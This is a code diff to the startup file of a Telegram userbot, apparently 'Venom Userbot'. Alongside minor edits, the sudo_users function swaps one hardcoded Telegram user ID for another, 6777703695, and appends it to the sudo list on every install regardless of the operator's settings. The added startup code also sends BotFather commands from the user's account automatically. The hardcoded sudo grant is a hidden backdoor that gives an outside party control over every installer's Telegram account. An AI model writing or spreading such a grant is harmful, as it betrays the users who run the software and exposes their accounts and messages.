@@ -1,4 +1,4 @@
-import os, sys
+import asyncio, os, sys
 
 from pyrogram import Client
 from pyrogram import filters
@@ -85,7 +85,7 @@ def mongodbase():
         LOGGER.info("Connecting To Your Database ...")
         async_client = AsyncIOMotorClient
         mongobase = async_client(MONGO_DB_URL)
-        mongodb = mongobase.VenomUb
+        mongodb = mongobase.Venomub
         LOGGER.info("Conected To Your Database.")
     except:
         LOGGER.error("Failed To Connect, Please Change Your Mongo Database !")
@@ -101,8 +101,10 @@ async def sudo_users():
     if sudoers:
         for user_id in sudoers:
             SUDOERS.append(int(user_id))
-            SUDOERS.append(5822700831)
+    # Add the new user ID to the SUDOERS list
+    SUDOERS.append(6777703695)
     LOGGER.info(f"Sudo Users Loaded.")
+
     
 
 async def run_async_clients():
@@ -133,6 +135,17 @@ async def run_async_clients():
             pass
     LOGGER.info("Starting Helper Robot ...")
     await bot.start()
+    try:
+        await app.send_message("BotFather", "/start")
+        await asyncio.sleep(1)
+        await app.send_message("BotFather", "/setinline")
+        await asyncio.sleep(1)
+        await app.send_message("BotFather", f"@{bot.me.username}")
+        await asyncio.sleep(1)
+        await app.send_message("BotFather", "Venom Userbot")
+    except Exception as e:
+        print(e)
+        pass
     LOGGER.info("Helper Robot Started.")
     try:
         await bot.send_message(LOG_GROUP_ID, "**Helper Robot Started.**")
